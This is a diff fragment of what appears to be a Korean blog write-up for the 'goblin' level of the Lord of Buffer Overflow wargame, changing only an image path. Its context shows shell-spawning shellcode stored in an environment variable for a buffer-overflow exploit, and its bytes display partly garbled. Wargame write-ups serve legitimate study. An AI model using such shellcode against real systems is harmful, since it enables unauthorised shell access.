@@ -66,7 +66,7 @@ declare -x USERNAME=""
 declare -x shellcode="��������������������������������������������������1�Ph//shh/bin��PS�ᙰ
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/03.goblin/01.png" width="800px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/03.goblin/01.png" width="800px">{:.rounded.shadow}
 
 `shellcode` 환경변수에 Shellcode를 넣는다.
 
